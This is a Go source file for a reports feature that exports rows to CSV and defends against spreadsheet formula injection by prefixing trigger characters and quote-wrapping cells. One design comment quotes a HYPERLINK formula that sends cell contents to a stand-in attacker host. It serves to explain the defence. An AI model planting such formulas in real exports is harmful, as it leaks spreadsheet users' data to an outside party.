package reports

// CSV for the report exports.
//
// ── A SPREADSHEET RUNS WHAT YOU GIVE IT ─────────────────────────────────────
//
// This is the second injection surface in the reports feature, and it is not the
// obvious one. A cell beginning `=`, `+`, `-`, `@`, a tab or a carriage return is
// evaluated as a FORMULA by Excel and Google Sheets — and several columns here
// carry router-controlled strings: an interface name, a ping target, an alert
// subject. An interface named `=HYPERLINK("http://evil.invalid?"&A1,"ok")` becomes
// a live link in the operator's spreadsheet.
//
// So a leading trigger character gets a single-quote prefix, which those programs
// treat as "the rest is literal text".
//
// ── THE ORDER OF THE TWO ESCAPES MATTERS ────────────────────────────────────
//
// Prefix FIRST, then quote-wrap. A cell that both starts with `=` and contains a
// comma has to come out as `"'=a,b"` — quoting first would put the prefix outside
// the quotes and change which characters the parser sees.
//
// ── NOT encoding/csv ────────────────────────────────────────────────────────
//
// That package writes RFC 4180 correctly and knows nothing about the prefix rule,
// so using it would mean applying the prefix separately and hoping the two agreed
// about when a field needs quoting. The original's own rule is reproduced here
// and gated against it.

import (
	"fmt"
	"strings"
)

// csvNeedsPrefix is the set a cell must not start with. `\t` and `\r` are in it
// because a leading whitespace character can carry a formula past a naive check
// in some importers, which is why the original lists them.
const csvNeedsPrefix = "=+-@\t\r"

// ToCSV renders rows in the given column order.
//
// A row missing a column, or holding a null, contributes an EMPTY field rather
// than the word "null" — the original's `v == null` covers both, and a
// spreadsheet column reading "null" is worse than a blank one.
func ToCSV(rows []map[string]any, columns []string) string {
	// `header + '\n' + body`, where body is the rows JOINED by newline — not a
	// newline written before each row. The two differ for an EMPTY result: the
	// original ends "a\n" and the per-row form ends "a". A trailing blank line
	// sounds like nothing until the export is byte-compared, which is how this
	// was found.
	lines := make([]string, 0, len(rows))
	for _, r := range rows {
		cells := make([]string, len(columns))
		for i, c := range columns {
			cells[i] = csvCell(r[c])
		}
		lines = append(lines, strings.Join(cells, ","))
	}
	return strings.Join(columns, ",") + "\n" + strings.Join(lines, "\n")
}

func csvCell(v any) string {
	if v == nil {
		return ""
	}
	s := csvString(v)
	// The prefix test is on the first BYTE, as the original's regex is on the
	// first UTF-16 unit: every character in the trigger set is ASCII, so a
	// multi-byte leading rune can never match either way.
	if s != "" && strings.ContainsRune(csvNeedsPrefix, rune(s[0])) {
		s = "'" + s
	}
	if strings.ContainsAny(s, ",\"\n") {
		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
	}
	return s
}

// csvString is JavaScript's `String(v)` for the values a report row can hold.
//
// `%v` on a float64 uses %g, which is the closest Go has to JavaScript's
// number-to-string: both print 12 for 12.0, both keep an exponent for 1e21, and
// both print 0.30000000000000004 for 0.1+0.2. Strings and booleans agree
// outright. The gate compares the rendered CSV, so any disagreement shows there
// rather than being argued about here.
func csvString(v any) string {
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}
